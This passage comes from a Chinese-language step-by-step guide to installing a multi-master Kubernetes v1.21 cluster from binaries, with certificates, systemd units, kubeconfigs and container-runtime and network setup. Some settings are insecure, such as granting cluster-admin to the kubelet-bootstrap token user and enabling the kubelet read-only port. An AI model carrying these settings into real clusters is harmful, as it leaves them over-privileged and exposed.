--tls-cert-file=/etc/kubernetes/ssl/kube-apiserver.pem \\ --tls-private-key-file=/etc/kubernetes/ssl/kube-apiserver-key.pem \\ --client-ca-file=/etc/kubernetes/ssl/ca.pem \\ --kubelet-client-certificate=/etc/kubernetes/ssl/kube-apiserver.pem \\ --kubelet-client-key=/etc/kubernetes/ssl/kube-apiserver-key.pem \\ --service-account-key-file=/etc/kubernetes/ssl/ca-key.pem \\ --service-account-signing-key-file=/etc/kubernetes/ssl/ca-key.pem \\ --service-account-issuer=api \\ --etcd-cafile=/etc/etcd/ssl/ca.pem \\ --etcd-certfile=/etc/etcd/ssl/etcd.pem \\ --etcd-keyfile=/etc/etcd/ssl/etcd-key.pem \\ --etcd-servers=https://192.168.224.12:2379,https://192.168.224.13:2379,https://192.168.224.14:2379 \\ --enable-swagger-ui=true \\ --allow-privileged=true \\ --apiserver-count=3 \\ --audit-log-maxage=30 \\ --audit-log-maxbackup=3 \\ --audit-log-maxsize=100 \\ --audit-log-path=/var/log/kube-apiserver-audit.log \\ --event-ttl=1h \\ --alsologtostderr=true \\ --logtostderr=false \\ --log-dir=/var/log/kubernetes \\ --v=4\"EOF 2.5.5.4 创建apiserver服务管理配置文件123456789101112131415161718cat &gt; /etc/systemd/system/kube-apiserver.service &lt;&lt; \"EOF\"[Unit]Description=Kubernetes API ServerDocumentation=https://github.com/kubernetes/kubernetesAfter=etcd.serviceWants=etcd.service[Service]EnvironmentFile=-/etc/kubernetes/kube-apiserver.confExecStart=/usr/local/bin/kube-apiserver $KUBE_APISERVER_OPTSRestart=on-failureRestartSec=5Type=notifyLimitNOFILE=65536[Install]WantedBy=multi-user.targetEOF 2.5.5.5 同步文件到集群master节点1cp ca*.pem /etc/kubernetes/ssl/ 1cp kube-apiserver*.pem /etc/kubernetes/ssl/ 1cp token.csv /etc/kubernetes/ 12scp /etc/kubernetes/token.csv k8s-master2:/etc/kubernetesscp /etc/kubernetes/token.csv k8s-master3:/etc/kubernetes 12scp /etc/kubernetes/ssl/kube-apiserver*.pem k8s-master2:/etc/kubernetes/sslscp /etc/kubernetes/ssl/kube-apiserver*.pem k8s-master3:/etc/kubernetes/ssl 12scp /etc/kubernetes/ssl/ca*.pem k8s-master2:/etc/kubernetes/sslscp /etc/kubernetes/ssl/ca*.pem k8s-master3:/etc/kubernetes/ssl 123456789101112131415161718192021222324252627282930313233343536373839scp /etc/kubernetes/kube-apiserver.conf k8s-master2:/etc/kubernetes/kube-apiserver.conf# cat /etc/kubernetes/kube-apiserver.confKUBE_APISERVER_OPTS=\"--enable-admission-plugins=NamespaceLifecycle,NodeRestriction,LimitRanger,ServiceAccount,DefaultStorageClass,ResourceQuota \\ --anonymous-auth=false \\ --bind-address=192.168.224.13 \\ --secure-port=6443 \\ --advertise-address=192.168.224.13 \\ --insecure-port=0 \\ --authorization-mode=Node,RBAC \\ --runtime-config=api/all=true \\ --enable-bootstrap-token-auth \\ --service-cluster-ip-range=10.96.0.0/16 \\ --token-auth-file=/etc/kubernetes/token.csv \\ --service-node-port-range=30000-32767 \\ --tls-cert-file=/etc/kubernetes/ssl/kube-apiserver.pem \\ --tls-private-key-file=/etc/kubernetes/ssl/kube-apiserver-key.pem \\ --client-ca-file=/etc/kubernetes/ssl/ca.pem \\ --kubelet-client-certificate=/etc/kubernetes/ssl/kube-apiserver.pem \\ --kubelet-client-key=/etc/kubernetes/ssl/kube-apiserver-key.pem \\ --service-account-key-file=/etc/kubernetes/ssl/ca-key.pem \\ --service-account-signing-key-file=/etc/kubernetes/ssl/ca-key.pem \\ --service-account-issuer=api \\ --etcd-cafile=/etc/etcd/ssl/ca.pem \\ --etcd-certfile=/etc/etcd/ssl/etcd.pem \\ --etcd-keyfile=/etc/etcd/ssl/etcd-key.pem \\ --etcd-servers=https://192.168.224.12:2379,https://192.168.224.13:2379,https://192.168.224.14:2379 \\ --enable-swagger-ui=true \\ --allow-privileged=true \\ --apiserver-count=3 \\ --audit-log-maxage=30 \\ --audit-log-maxbackup=3 \\ --audit-log-maxsize=100 \\ --audit-log-path=/var/log/kube-apiserver-audit.log \\ --event-ttl=1h \\ --alsologtostderr=true \\ --logtostderr=false \\ --log-dir=/var/log/kubernetes \\ --v=4\" 123456789101112131415161718192021222324252627282930313233343536373839scp /etc/kubernetes/kube-apiserver.conf k8s-master3:/etc/kubernetes/kube-apiserver.conf# cat /etc/kubernetes/kube-apiserver.confKUBE_APISERVER_OPTS=\"--enable-admission-plugins=NamespaceLifecycle,NodeRestriction,LimitRanger,ServiceAccount,DefaultStorageClass,ResourceQuota \\ --anonymous-auth=false \\ --bind-address=192.168.224.14 \\ --secure-port=6443 \\ --advertise-address=192.168.224.14 \\ --insecure-port=0 \\ --authorization-mode=Node,RBAC \\ --runtime-config=api/all=true \\ --enable-bootstrap-token-auth \\ --service-cluster-ip-range=10.96.0.0/16 \\ --token-auth-file=/etc/kubernetes/token.csv \\ --service-node-port-range=30000-32767 \\ --tls-cert-file=/etc/kubernetes/ssl/kube-apiserver.pem \\ --tls-private-key-file=/etc/kubernetes/ssl/kube-apiserver-key.pem \\ --client-ca-file=/etc/kubernetes/ssl/ca.pem \\ --kubelet-client-certificate=/etc/kubernetes/ssl/kube-apiserver.pem \\ --kubelet-client-key=/etc/kubernetes/ssl/kube-apiserver-key.pem \\ --service-account-key-file=/etc/kubernetes/ssl/ca-key.pem \\ --service-account-signing-key-file=/etc/kubernetes/ssl/ca-key.pem \\ --service-account-issuer=api \\ --etcd-cafile=/etc/etcd/ssl/ca.pem \\ --etcd-certfile=/etc/etcd/ssl/etcd.pem \\ --etcd-keyfile=/etc/etcd/ssl/etcd-key.pem \\ --etcd-servers=https://192.168.224.12:2379,https://192.168.224.13:2379,https://192.168.224.14:2379 \\ --enable-swagger-ui=true \\ --allow-privileged=true \\ --apiserver-count=3 \\ --audit-log-maxage=30 \\ --audit-log-maxbackup=3 \\ --audit-log-maxsize=100 \\ --audit-log-path=/var/log/kube-apiserver-audit.log \\ --event-ttl=1h \\ --alsologtostderr=true \\ --logtostderr=false \\ --log-dir=/var/log/kubernetes \\ --v=4\" 123scp /etc/systemd/system/kube-apiserver.service k8s-master2:/etc/systemd/system/kube-apiserver.servicescp /etc/systemd/system/kube-apiserver.service k8s-master3:/etc/systemd/system/kube-apiserver.service 2.5.5.6 启动apiserver服务12345678910systemctl daemon-reloadsystemctl enable --now kube-apiserversystemctl status kube-apiserver# 测试curl --insecure https://192.168.224.12:6443/curl --insecure https://192.168.224.13:6443/curl --insecure https://192.168.224.14:6443/curl --insecure https://192.168.224.100:6443/ 2.5.6 部署kubectl2.5.6.1 创建kubectl证书请求文件12345678910111213141516171819cat &gt; admin-csr.json &lt;&lt; \"EOF\"{ \"CN\": \"admin\", \"hosts\": [], \"key\": { \"algo\": \"rsa\", \"size\": 2048 }, \"names\": [ { \"C\": \"CN\", \"ST\": \"Beijing\", \"L\": \"Beijing\", \"O\": \"system:masters\", \"OU\": \"system\" } ]}EOF 12345678说明：后续 kube-apiserver 使用 RBAC 对客户端(如 kubelet、kube-proxy、Pod)请求进行授权；kube-apiserver 预定义了一些 RBAC 使用的 RoleBindings，如 cluster-admin 将 Group system:masters 与 Role cluster-admin 绑定，该 Role 授予了调用kube-apiserver 的所有 API的权限；O指定该证书的 Group 为 system:masters，kubelet 使用该证书访问 kube-apiserver 时 ，由于证书被 CA 签名，所以认证通过，同时由于证书用户组为经过预授权的 system:masters，所以被授予访问所有 API 的权限；注：这个admin 证书，是将来生成管理员用的kubeconfig 配置文件用的，现在我们一般建议使用RBAC 来对kubernetes 进行角色权限控制， kubernetes 将证书中的CN 字段 作为User， O 字段作为 Group；\"O\": \"system:masters\", 必须是system:masters，否则后面kubectl create clusterrolebinding报错。 2.5.6.2 生成证书文件1cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=kubernetes admin-csr.json | cfssljson -bare admin 2.5.6.3 复制文件到指定目录1cp admin*.pem /etc/kubernetes/ssl/ 2.5.6.4 生成kubeconfig配置文件kube.config 为 kubectl 的配置文件，包含访问 apiserver 的所有信息，如 apiserver 地址、CA 证书和自身使用的证书 1234567kubectl config set-cluster kubernetes --certificate-authority=ca.pem --embed-certs=true --server=https://192.168.224.100:6443 --kubeconfig=kube.configkubectl config set-credentials admin --client-certificate=admin.pem --client-key=admin-key.pem --embed-certs=true --kubeconfig=kube.configkubectl config set-context kubernetes --cluster=kubernetes --user=admin --kubeconfig=kube.configkubectl config use-context kubernetes --kubeconfig=kube.config 2.5.6.5 准备kubectl配置文件并进行角色绑定123mkdir ~/.kubecp kube.config ~/.kube/configkubectl create clusterrolebinding kube-apiserver:kubelet-apis --clusterrole=system:kubelet-api-admin --user kubernetes --kubeconfig=/root/.kube/config 2.5.6.6 查看集群状态1export KUBECONFIG=$HOME/.kube/config 12345678查看集群信息kubectl cluster-info查看集群组件状态kubectl get componentstatuses查看命名空间中资源对象kubectl get all --all-namespaces 2.5.6.7 同步kubectl配置文件到集群其它master节点12345k8s-master2:mkdir /root/.kubek8s-master3:mkdir /root/.kube 12scp /root/.kube/config k8s-master2:/root/.kube/configscp /root/.kube/config k8s-master3:/root/.kube/config 2.5.6.8 配置kubectl命令补全(可选)123456789101112131415yum install -y bash-completionsource /usr/share/bash-completion/bash_completionsource &lt;(kubectl completion bash)kubectl completion bash &gt; ~/.kube/completion.bash.incsource '/root/.kube/completion.bash.inc' source $HOME/.bash_profile或者添加命令自动补全：yum install -y bash-completionvim ~/.bashrc添加source &lt;(kubectl completion bash)执行下source ~/.bashrc 2.5.7 部署kube-controller-manager2.5.7.1 创建kube-controller-manager证书请求文件123456789101112131415161718192021222324cat &gt; kube-controller-manager-csr.json &lt;&lt; \"EOF\"{ \"CN\": \"system:kube-controller-manager\", \"key\": { \"algo\": \"rsa\", \"size\": 2048 }, \"hosts\": [ \"127.0.0.1\", \"192.168.224.12\", \"192.168.224.13\", \"192.168.224.14\" ], \"names\": [ { \"C\": \"CN\", \"ST\": \"Beijing\", \"L\": \"Beijing\", \"O\": \"system:kube-controller-manager\", \"OU\": \"system\" } ]}EOF 12345说明：hosts 列表包含所有 kube-controller-manager 节点 IP；CN 为 system:kube-controller-manager;O 为 system:kube-controller-manager，kubernetes 内置的 ClusterRoleBindings system:kube-controller-manager 赋予 kube-controller-manager 工作所需的权限 2.5.7.2 创建kube-controller-manager证书文件1cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=kubernetes kube-controller-manager-csr.json | cfssljson -bare kube-controller-manager 123456# lskube-controller-manager.csr kube-controller-manager-csr.jsonkube-controller-manager-key.pemkube-controller-manager.pem 2.5.7.3 创建kube-controller-manager的kube-controller-manager.kubeconfig1234567kubectl config set-cluster kubernetes --certificate-authority=ca.pem --embed-certs=true --server=https://192.168.224.100:6443 --kubeconfig=kube-controller-manager.kubeconfigkubectl config set-credentials system:kube-controller-manager --client-certificate=kube-controller-manager.pem --client-key=kube-controller-manager-key.pem --embed-certs=true --kubeconfig=kube-controller-manager.kubeconfigkubectl config set-context system:kube-controller-manager --cluster=kubernetes --user=system:kube-controller-manager --kubeconfig=kube-controller-manager.kubeconfigkubectl config use-context system:kube-controller-manager --kubeconfig=kube-controller-manager.kubeconfig 2.5.7.4 创建kube-controller-manager配置文件123456789101112131415161718192021222324252627cat &gt; kube-controller-manager.conf &lt;&lt; \"EOF\"KUBE_CONTROLLER_MANAGER_OPTS=\"--port=10252 \\ --secure-port=10257 \\ --bind-address=127.0.0.1 \\ --kubeconfig=/etc/kubernetes/kube-controller-manager.kubeconfig \\ --service-cluster-ip-range=10.96.0.0/16 \\ --cluster-name=kubernetes \\ --cluster-signing-cert-file=/etc/kubernetes/ssl/ca.pem \\ --cluster-signing-key-file=/etc/kubernetes/ssl/ca-key.pem \\ --allocate-node-cidrs=true \\ --cluster-cidr=10.244.0.0/16 \\ --experimental-cluster-signing-duration=87600h \\ --root-ca-file=/etc/kubernetes/ssl/ca.pem \\ --service-account-private-key-file=/etc/kubernetes/ssl/ca-key.pem \\ --leader-elect=true \\ --feature-gates=RotateKubeletServerCertificate=true \\ --controllers=*,bootstrapsigner,tokencleaner \\ --horizontal-pod-autoscaler-use-rest-clients=true \\ --horizontal-pod-autoscaler-sync-period=10s \\ --tls-cert-file=/etc/kubernetes/ssl/kube-controller-manager.pem \\ --tls-private-key-file=/etc/kubernetes/ssl/kube-controller-manager-key.pem \\ --use-service-account-credentials=true \\ --alsologtostderr=true \\ --logtostderr=false \\ --log-dir=/var/log/kubernetes \\ --v=2\"EOF 2.5.7.5 创建服务启动文件1234567891011121314cat &gt; kube-controller-manager.service &lt;&lt; \"EOF\"[Unit]Description=Kubernetes Controller ManagerDocumentation=https://github.com/kubernetes/kubernetes[Service]EnvironmentFile=-/etc/kubernetes/kube-controller-manager.confExecStart=/usr/local/bin/kube-controller-manager $KUBE_CONTROLLER_MANAGER_OPTSRestart=on-failureRestartSec=5[Install]WantedBy=multi-user.targetEOF 2.5.7.6 同步文件到集群master节点1234cp kube-controller-manager*.pem /etc/kubernetes/ssl/cp kube-controller-manager.kubeconfig /etc/kubernetes/cp kube-controller-manager.conf /etc/kubernetes/cp kube-controller-manager.service /usr/lib/systemd/system/ 123456scp kube-controller-manager*.pem k8s-master2:/etc/kubernetes/ssl/scp kube-controller-manager*.pem k8s-master3:/etc/kubernetes/ssl/scp kube-controller-manager.kubeconfig kube-controller-manager.conf k8s-master2:/etc/kubernetes/scp kube-controller-manager.kubeconfig kube-controller-manager.conf k8s-master3:/etc/kubernetes/scp kube-controller-manager.service k8s-master2:/usr/lib/systemd/system/scp kube-controller-manager.service k8s-master3:/usr/lib/systemd/system/ 12#查看证书openssl x509 -in /etc/kubernetes/ssl/kube-controller-manager.pem -noout -text 2.5.7.7 启动服务123systemctl daemon-reload systemctl enable --now kube-controller-managersystemctl status kube-controller-manager 1kubectl get componentstatuses 2.5.8 部署kube-scheduler2.5.8.1 创建kube-scheduler证书请求文件123456789101112131415161718192021222324cat &gt; kube-scheduler-csr.json &lt;&lt; \"EOF\"{ \"CN\": \"system:kube-scheduler\", \"hosts\": [ \"127.0.0.1\", \"192.168.224.12\", \"192.168.224.13\", \"192.168.224.14\" ], \"key\": { \"algo\": \"rsa\", \"size\": 2048 }, \"names\": [ { \"C\": \"CN\", \"ST\": \"Beijing\", \"L\": \"Beijing\", \"O\": \"system:kube-scheduler\", \"OU\": \"system\" } ]}EOF 2.5.8.2 生成kube-scheduler证书1cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=kubernetes kube-scheduler-csr.json | cfssljson -bare kube-scheduler 12345# lskube-scheduler.csrkube-scheduler-csr.jsonkube-scheduler-key.pemkube-scheduler.pem 2.5.8.3 创建kube-scheduler的kubeconfig1234567kubectl config set-cluster kubernetes --certificate-authority=ca.pem --embed-certs=true --server=https://192.168.224.100:6443 --kubeconfig=kube-scheduler.kubeconfigkubectl config set-credentials system:kube-scheduler --client-certificate=kube-scheduler.pem --client-key=kube-scheduler-key.pem --embed-certs=true --kubeconfig=kube-scheduler.kubeconfigkubectl config set-context system:kube-scheduler --cluster=kubernetes --user=system:kube-scheduler --kubeconfig=kube-scheduler.kubeconfigkubectl config use-context system:kube-scheduler --kubeconfig=kube-scheduler.kubeconfig 2.5.8.4 创建服务配置文件123456789cat &gt; kube-scheduler.conf &lt;&lt; \"EOF\"KUBE_SCHEDULER_OPTS=\"--address=127.0.0.1 \\--kubeconfig=/etc/kubernetes/kube-scheduler.kubeconfig \\--leader-elect=true \\--alsologtostderr=true \\--logtostderr=false \\--log-dir=/var/log/kubernetes \\--v=2\"EOF 2.5.8.5创建服务启动配置文件1234567891011121314cat &gt; kube-scheduler.service &lt;&lt; \"EOF\"[Unit]Description=Kubernetes SchedulerDocumentation=https://github.com/kubernetes/kubernetes[Service]EnvironmentFile=-/etc/kubernetes/kube-scheduler.confExecStart=/usr/local/bin/kube-scheduler $KUBE_SCHEDULER_OPTSRestart=on-failureRestartSec=5[Install]WantedBy=multi-user.targetEOF 2.5.8.6 同步文件至集群master节点1234cp kube-scheduler*.pem /etc/kubernetes/ssl/cp kube-scheduler.kubeconfig /etc/kubernetes/cp kube-scheduler.conf /etc/kubernetes/cp kube-scheduler.service /usr/lib/systemd/system/ 123456scp kube-scheduler*.pem k8s-master2:/etc/kubernetes/ssl/scp kube-scheduler*.pem k8s-master3:/etc/kubernetes/ssl/scp kube-scheduler.kubeconfig kube-scheduler.conf k8s-master2:/etc/kubernetes/scp kube-scheduler.kubeconfig kube-scheduler.conf k8s-master3:/etc/kubernetes/scp kube-scheduler.service k8s-master2:/usr/lib/systemd/system/scp kube-scheduler.service k8s-master3:/usr/lib/systemd/system/ 2.5.8.7 启动服务123systemctl daemon-reloadsystemctl enable --now kube-schedulersystemctl status kube-scheduler 2.5.9 工作节点（worker node）部署2.5.9.1 Containerd安装及配置2.5.9.1.1 获取软件包 1wget https://github.com/containerd/containerd/releases/download/v1.6.1/cri-containerd-cni-1.6.1-linux-amd64.tar.gz 2.5.9.1.2 安装containerd1tar -xf cri-containerd-cni-1.6.1-linux-amd64.tar.gz -C / 12345默认解压后会有如下目录：etcoptusr会把对应的目解压到/下对应目录中，这样就省去复制文件步骤。 2.5.9.1.3 生成配置文件并修改1mkdir /etc/containerd 1containerd config default &gt;/etc/containerd/config.toml 12# ls /etc/containerd/config.toml 12下面的配置文件中已修改，可不执行，仅修改默认时执行。sed -i 's@systemd_cgroup = false@systemd_cgroup = true@' /etc/containerd/config.toml 12下面的配置文件中已修改，可不执行，仅修改默认时执行。sed -i 's@k8s.gcr.io/pause:3.6@registry.aliyuncs.com/google_containers/pause:3.6@' /etc/containerd/config.toml 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697# cat &gt;/etc/containerd/config.toml&lt;&lt;EOFroot = \"/var/lib/containerd\"state = \"/run/containerd\"oom_score = -999[grpc] address = \"/run/containerd/containerd.sock\" uid = 0 gid = 0 max_recv_message_size = 16777216 max_send_message_size = 16777216[debug] address = \"\" uid = 0 gid = 0 level = \"\"[metrics] address = \"\" grpc_histogram = false[cgroup] path = \"\"[plugins] [plugins.cgroups] no_prometheus = false [plugins.cri] stream_server_address = \"127.0.0.1\" stream_server_port = \"0\" enable_selinux = false sandbox_image = \"registry.aliyuncs.com/google_containers/pause:3.6\" stats_collect_period = 10 systemd_cgroup = true enable_tls_streaming = false max_container_log_line_size = 16384 [plugins.cri.containerd] snapshotter = \"overlayfs\" no_pivot = false [plugins.cri.containerd.default_runtime] runtime_type = \"io.containerd.runtime.v1.linux\" runtime_engine = \"\" runtime_root = \"\" [plugins.cri.containerd.untrusted_workload_runtime] runtime_type = \"\" runtime_engine = \"\" runtime_root = \"\" [plugins.cri.cni] bin_dir = \"/opt/cni/bin\" conf_dir = \"/etc/cni/net.d\" conf_template = \"/etc/cni/net.d/10-default.conf\" [plugins.cri.registry] [plugins.cri.registry.mirrors] [plugins.cri.registry.mirrors.\"docker.io\"] endpoint = [ \"https://docker.mirrors.ustc.edu.cn\", \"http://hub-mirror.c.163.com\" ] [plugins.cri.registry.mirrors.\"gcr.io\"] endpoint = [ \"https://gcr.mirrors.ustc.edu.cn\" ] [plugins.cri.registry.mirrors.\"k8s.gcr.io\"] endpoint = [ \"https://gcr.mirrors.ustc.edu.cn/google-containers/\" ] [plugins.cri.registry.mirrors.\"quay.io\"] endpoint = [ \"https://quay.mirrors.ustc.edu.cn\" ] [plugins.cri.registry.mirrors.\"harbor.kubemsb.com\"] endpoint = [ \"http://harbor.kubemsb.com\" ] [plugins.cri.x509_key_pair_streaming] tls_cert_file = \"\" tls_key_file = \"\" [plugins.diff-service] default = [\"walking\"] [plugins.linux] shim = \"containerd-shim\" runtime = \"runc\" runtime_root = \"\" no_shim = false shim_debug = false [plugins.opt] path = \"/opt/containerd\" [plugins.restart] interval = \"10s\" [plugins.scheduler] pause_threshold = 0.02 deletion_threshold = 0 mutation_threshold = 100 schedule_delay = \"0s\" startup_delay = \"100ms\"EOF 2.5.9.1.4 安装runc 由于上述软件包中包含的runc对系统依赖过多，所以建议单独下载安装。 默认runc执行时提示：runc: symbol lookup error: runc: undefined symbol: seccomp_notify_respond 1wget https://github.com/opencontainers/runc/releases/download/v1.1.0/runc.amd64 1chmod +x runc.amd64 123替换掉原软件包中的runcmv runc.amd64 /usr/local/sbin/runc 123456# runc -vrunc version 1.1.0commit: v1.1.0-0-g067aaf85spec: 1.0.2-devgo: go1.17.6libseccomp: 2.5.3 12systemctl enable containerdsystemctl start containerd 2.5.9.2 部署kubelet 在k8s-master1上操作 2.5.9.2.1 创建kubelet-bootstrap.kubeconfig123456789BOOTSTRAP_TOKEN=$(awk -F \",\" '{print $1}' /etc/kubernetes/token.csv)kubectl config set-cluster kubernetes --certificate-authority=ca.pem --embed-certs=true --server=https://192.168.224.100:6443 --kubeconfig=kubelet-bootstrap.kubeconfigkubectl config set-credentials kubelet-bootstrap --token=${BOOTSTRAP_TOKEN} --kubeconfig=kubelet-bootstrap.kubeconfigkubectl config set-context default --cluster=kubernetes --user=kubelet-bootstrap --kubeconfig=kubelet-bootstrap.kubeconfigkubectl config use-context default --kubeconfig=kubelet-bootstrap.kubeconfig 123kubectl create clusterrolebinding cluster-system-anonymous --clusterrole=cluster-admin --user=kubelet-bootstrapkubectl create clusterrolebinding kubelet-bootstrap --clusterrole=system:node-bootstrapper --user=kubelet-bootstrap --kubeconfig=kubelet-bootstrap.kubeconfig 123kubectl describe clusterrolebinding cluster-system-anonymouskubectl describe clusterrolebinding kubelet-bootstrap 2.5.9.2.2 创建kubelet配置文件123456789101112131415161718192021222324252627282930313233cat &gt; kubelet.json &lt;&lt; \"EOF\"{ \"kind\": \"KubeletConfiguration\", \"apiVersion\": \"kubelet.config.k8s.io/v1beta1\", \"authentication\": { \"x509\": { \"clientCAFile\": \"/etc/kubernetes/ssl/ca.pem\" }, \"webhook\": { \"enabled\": true, \"cacheTTL\": \"2m0s\" }, \"anonymous\": { \"enabled\": false } }, \"authorization\": { \"mode\": \"Webhook\", \"webhook\": { \"cacheAuthorizedTTL\": \"5m0s\", \"cacheUnauthorizedTTL\": \"30s\" } }, \"address\": \"192.168.224.12\", \"port\": 10250, \"readOnlyPort\": 10255, \"cgroupDriver\": \"systemd\", \"hairpinMode\": \"promiscuous-bridge\", \"serializeImagePulls\": false, \"clusterDomain\": \"cluster.local.\", \"clusterDNS\": [\"10.96.0.2\"]}EOF 2.5.9.2.3 创建kubelet服务启动管理文件1234567891011121314151617181920212223242526272829303132cat &gt; kubelet.service &lt;&lt; \"EOF\"[Unit]Description=Kubernetes KubeletDocumentation=https://github.com/kubernetes/kubernetesAfter=containerd.serviceRequires=containerd.service[Service]WorkingDirectory=/var/lib/kubeletExecStart=/usr/local/bin/kubelet \\ --bootstrap-kubeconfig=/etc/kubernetes/kubelet-bootstrap.kubeconfig \\ --cert-dir=/etc/kubernetes/ssl \\ --kubeconfig=/etc/kubernetes/kubelet.kubeconfig \\ --config=/etc/kubernetes/kubelet.json \\ --cni-bin-dir=/opt/cni/bin \\ --cni-conf-dir=/etc/cni/net.d \\ --container-runtime=remote \\ --container-runtime-endpoint=unix:///run/containerd/containerd.sock \\ --network-plugin=cni \\ --rotate-certificates \\ --pod-infra-container-image=registry.aliyuncs.com/google_containers/pause:3.2 \\ --root-dir=/etc/cni/net.d \\ --alsologtostderr=true \\ --logtostderr=false \\ --log-dir=/var/log/kubernetes \\ --v=2Restart=on-failureRestartSec=5[Install]WantedBy=multi-user.targetEOF 2.5.9.2.4 同步文件到集群节点123cp kubelet-bootstrap.kubeconfig /etc/kubernetes/cp kubelet.json /etc/kubernetes/cp kubelet.service /usr/lib/systemd/system/ 12345for i in k8s-master2 k8s-master3 k8s-worker1;do scp kubelet-bootstrap.kubeconfig kubelet.json $i:/etc/kubernetes/;donefor i in k8s-master2 k8s-master3 k8s-worker1;do scp ca.pem $i:/etc/kubernetes/ssl/;donefor i in k8s-master2 k8s-master3 k8s-worker1;do scp kubelet.service $i:/usr/lib/systemd/system/;done 12说明：kubelet.json中address需要修改为当前主机IP地址。 2.5.9.2.5 创建目录及启动服务12mkdir -p /var/lib/kubeletmkdir -p /var/log/kubernetes 1234systemctl daemon-reloadsystemctl enable --now kubeletsystemctl status kubelet 123456# kubectl get nodesNAME STATUS ROLES AGE VERSIONk8s-master1 NotReady &lt;none&gt; 2m55s v1.21.10k8s-master2 NotReady &lt;none&gt; 45s v1.21.10k8s-master3 NotReady &lt;none&gt; 39s v1.21.10k8s-worker1 NotReady &lt;none&gt; 5m1s v1.21.10 123456# kubectl get csrNAME AGE SIGNERNAME REQUESTOR CONDITIONcsr-b949p 7m55s kubernetes.io/kube-apiserver-client-kubelet kubelet-bootstrap Approved,Issuedcsr-c9hs4 3m34s kubernetes.io/kube-apiserver-client-kubelet kubelet-bootstrap Approved,Issuedcsr-r8vhp 5m50s kubernetes.io/kube-apiserver-client-kubelet kubelet-bootstrap Approved,Issuedcsr-zb4sr 3m40s kubernetes.io/kube-apiserver-client-kubelet kubelet-bootstrap Approved,Issued 12说明：确认kubelet服务启动成功后，接着到master上Approve一下bootstrap请求。 2.5.9.3 部署kube-proxy2.5.9.3.1 创建kube-proxy证书请求文件123456789101112131415161718cat &gt; kube-proxy-csr.json &lt;&lt; \"EOF\"{ \"CN\": \"system:kube-proxy\", \"key\": { \"algo\": \"rsa\", \"size\": 2048 }, \"names\": [ { \"C\": \"CN\", \"ST\": \"Beijing\", \"L\": \"Beijing\", \"O\": \"kubemsb\", \"OU\": \"CN\" } ]}EOF 2.5.9.3.2 生成证书1cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=kubernetes kube-proxy-csr.json | cfssljson -bare kube-proxy 12# ls kube-proxy*kube-proxy.csr kube-proxy-csr.json kube-proxy-key.pem kube-proxy.pem 2.5.9.3.3 创建kubeconfig文件1234567kubectl config set-cluster kubernetes --certificate-authority=ca.pem --embed-certs=true --server=https://192.168.224.100:6443 --kubeconfig=kube-proxy.kubeconfigkubectl config set-credentials kube-proxy --client-certificate=kube-proxy.pem --client-key=kube-proxy-key.pem --embed-certs=true --kubeconfig=kube-proxy.kubeconfigkubectl config set-context default --cluster=kubernetes --user=kube-proxy --kubeconfig=kube-proxy.kubeconfigkubectl config use-context default --kubeconfig=kube-proxy.kubeconfig 2.5.9.3.4 创建服务配置文件1234567891011cat &gt; kube-proxy.yaml &lt;&lt; \"EOF\"apiVersion: kubeproxy.config.k8s.io/v1alpha1bindAddress: 192.168.224.12clientConnection: kubeconfig: /etc/kubernetes/kube-proxy.kubeconfigclusterCIDR: 10.244.0.0/16healthzBindAddress: 192.168.224.12:10256kind: KubeProxyConfigurationmetricsBindAddress: 192.168.224.12:10249mode: \"ipvs\"EOF 2.5.9.3.5 创建服务启动管理文件123456789101112131415161718192021cat &gt; kube-proxy.service &lt;&lt; \"EOF\"[Unit]Description=Kubernetes Kube-Proxy ServerDocumentation=https://github.com/kubernetes/kubernetesAfter=network.target[Service]WorkingDirectory=/var/lib/kube-proxyExecStart=/usr/local/bin/kube-proxy \\ --config=/etc/kubernetes/kube-proxy.yaml \\ --alsologtostderr=true \\ --logtostderr=false \\ --log-dir=/var/log/kubernetes \\ --v=2Restart=on-failureRestartSec=5LimitNOFILE=65536[Install]WantedBy=multi-user.targetEOF 2.5.9.3.6 同步文件到集群工作节点主机123cp kube-proxy*.pem /etc/kubernetes/ssl/cp kube-proxy.kubeconfig kube-proxy.yaml /etc/kubernetes/cp kube-proxy.service /usr/lib/systemd/system/ 12for i in k8s-master2 k8s-master3 k8s-worker1;do scp kube-proxy.kubeconfig kube-proxy.yaml $i:/etc/kubernetes/;donefor i in k8s-master2 k8s-master3 k8s-worker1;do scp kube-proxy.service $i:/usr/lib/systemd/system/;done 12说明：修改kube-proxy.yaml中IP地址为当前主机IP. 2.5.9.3.7 服务启动1mkdir -p /var/lib/kube-proxy 1234systemctl daemon-reloadsystemctl enable --now kube-proxysystemctl status kube-proxy 2.5.10 网络组件部署 Calico2.5.10.1 下载1wget https://docs.projectcalico.org/v3.19/manifests/calico.yaml 2.5.10.2 修改文件123683 - name: CALICO_IPV4POOL_CIDR3684 value: \"10.244.0.0/16\" 2.5.10.3 应用文件1kubectl apply -f calico.yaml 2.5.10.4 验证应用结果1234567# kubectl get pods -ANAMESPACE NAME READY STATUS RESTARTS AGEkube-system calico-kube-controllers-7cc8dd57d9-tf2m5 1/1 Running 0 72skube-system calico-node-llw5w 1/1 Running 0 72skube-system calico-node-mhh6g 1/1 Running 0 72skube-system calico-node-twj99 1/1 Running 0 72skube-system calico-node-zh6xl 1/1 Running 0 72s 123456# kubectl get nodesNAME STATUS ROLES AGE VERSIONk8s-master1 Ready &lt;none&gt; 55m v1.21.10k8s-master2 Ready &lt;none&gt; 53m v1.21.10k8s-master3 Ready &lt;none&gt; 53m v1.21.10k8s-worker1 Ready &lt;none&gt; 57m v1.21.10 2.5.10 部署CoreDNS123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201cat &gt; coredns.yaml &lt;&lt; \"EOF\"apiVersion: v1kind: ServiceAccountmetadata: name: coredns namespace: kube-system---apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRolemetadata: labels: kubernetes.io/bootstrapping: rbac-defaults name: system:corednsrules: - apiGroups: - \"\" resources: - endpoints - 